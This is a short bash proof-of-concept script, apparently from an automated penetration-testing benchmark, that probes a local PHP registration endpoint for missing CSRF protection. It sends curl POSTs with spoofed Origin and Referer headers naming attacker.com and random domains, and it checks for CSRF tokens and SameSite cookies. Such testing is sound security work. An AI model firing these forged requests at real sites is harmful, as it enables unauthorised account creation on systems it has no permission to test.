#!/bin/bash
# POC: Demonstrates CSRF vulnerability in registration endpoint by submitting cross-origin registration requests without CSRF tokens
# Target: ./repo
# Created: 2025-11-07T17:45:32.411Z
# Session: benchmark-XBEN-069-24-mhp4ra0s

# CSRF Vulnerability POC - Registration Endpoint
# Demonstrates missing CSRF protection on /api/register.php

TARGET_URL="http://localhost:8080"
REGISTER_ENDPOINT="$TARGET_URL/api/register.php"

echo "=== CSRF Vulnerability PoC: Registration Endpoint ==="
echo "Target: $REGISTER_ENDPOINT"
echo ""

# Test 1: Attempt registration without CSRF token (first, get the registration form)
echo "[*] Test 1: Checking for CSRF token in registration form"
FORM_RESPONSE=$(curl -s "$TARGET_URL/register.php")
if echo "$FORM_RESPONSE" | grep -q "csrf\|token\|nonce"; then
    echo "[-] CSRF tokens found in form (expected protection)"
else
    echo "[+] No CSRF tokens found in registration form"
fi
echo ""

# Test 2: Attempt registration from cross-origin without token
echo "[*] Test 2: Submitting registration from cross-origin (simulating CSRF attack)"
TIMESTAMP=$(date +%s)
CSRF_TEST_USER="csrftest_${TIMESTAMP}"
CSRF_TEST_EMAIL="${CSRF_TEST_USER}@example.com"

# Simulate attacker's site making the request
CSRF_RESPONSE=$(curl -s -X POST "$REGISTER_ENDPOINT" \
  -H "Origin: http://attacker.com" \
  -H "Referer: http://attacker.com/malicious.html" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=${CSRF_TEST_USER}&email=${CSRF_TEST_EMAIL}&password=Password123!" \
  -w "\n%{http_code}")

HTTP_CODE=$(echo "$CSRF_RESPONSE" | tail -n 1)
RESPONSE_BODY=$(echo "$CSRF_RESPONSE" | sed '$d')

echo "HTTP Status: $HTTP_CODE"
echo "Response: $RESPONSE_BODY"

if [ "$HTTP_CODE" == "200" ]; then
    echo "[+] VULNERABILITY CONFIRMED: Cross-origin registration accepted without CSRF token!"
    if echo "$RESPONSE_BODY" | grep -q "success.*true"; then
        echo "[+] Registration successful - CSRF attack would work!"
    fi
else
    echo "[-] Request rejected or returned error"
fi
echo ""

# Test 3: Verify no SameSite protection in cookies
echo "[*] Test 3: Checking cookie SameSite attributes"
COOKIE_RESPONSE=$(curl -s -i "$TARGET_URL/register.php" 2>&1)
if echo "$COOKIE_RESPONSE" | grep -i "set-cookie" | grep -qi "samesite"; then
    echo "[-] SameSite attribute detected on cookies"
else
    echo "[+] No SameSite protection on cookies"
fi
echo ""

# Test 4: Verify no Origin/Referer validation
echo "[*] Test 4: Testing Origin/Referer validation"
FAKE_ORIGIN_TEST=$(curl -s -X POST "$REGISTER_ENDPOINT" \
  -H "Origin: http://completely-random-domain-${TIMESTAMP}.com" \
  -H "Referer: http://completely-random-domain-${TIMESTAMP}.com/page" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=test_random_${TIMESTAMP}&email=test_random_${TIMESTAMP}@test.com&password=Password123!")

if echo "$FAKE_ORIGIN_TEST" | grep -q "success"; then
    echo "[+] VULNERABILITY: Requests from arbitrary Origins are accepted"
else
    echo "[-] Some Origin validation may be in place"
fi
echo ""

echo "=== POC Summary ==="
echo "CSRF vulnerability in registration endpoint confirmed:"
echo "1. No CSRF tokens required"
echo "2. Cross-origin requests accepted"
echo "3. No Origin/Referer validation"
echo "4. No SameSite cookie protection"